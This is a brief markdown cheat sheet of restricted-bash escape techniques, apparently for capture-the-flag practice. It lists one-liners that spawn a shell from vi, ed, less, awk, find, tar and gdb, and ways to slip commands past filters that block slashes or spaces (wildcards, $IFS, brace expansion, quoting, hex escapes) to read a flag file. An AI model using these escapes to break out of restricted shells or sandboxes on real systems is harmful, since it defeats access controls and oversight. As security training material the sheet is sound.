# Restricted Bash (RBash) Escapes (skills/misc/bash-jail.md)

## 1. Common Escape Vectors

### 1.1 Shell Spawning from Common Utilities
- **`vi` / `vim`**: `:set shell=/bin/sh` $\rightarrow$ `:shell`
- **`ed`**: `!/bin/sh`
- **`less` / `more`**: `!/bin/sh`
- **`awk`**: `awk 'BEGIN {system("/bin/sh")}'`
- **`find`**: `find . -exec /bin/sh \; -quit`
- **`tar`**: `tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`
- **`gdb`**: `gdb -nx -ex '!sh' -ex 'quit'`

---

## 2. Character & Path Blacklist Bypasses

### 2.1 Slashes Blocked (`/`)
- Execute binaries via `PATH`: `PATH=$PATH:. ./script` or `export PATH=$PATH:/bin`.
- Wildcards: `/???/???` $\rightarrow$ `/bin/cat /???/????` $\rightarrow$ `/bin/cat /flag`

### 2.2 Space Blocked
- Use `$IFS`: `cat$IFS/flag` or `{cat,/flag}`.
- Redirection: `cat</flag`.

### 2.3 Command Concatenation
- `c'a't /flag` or `c\at /flag` or `$'\x63\x61\x74' /flag`.
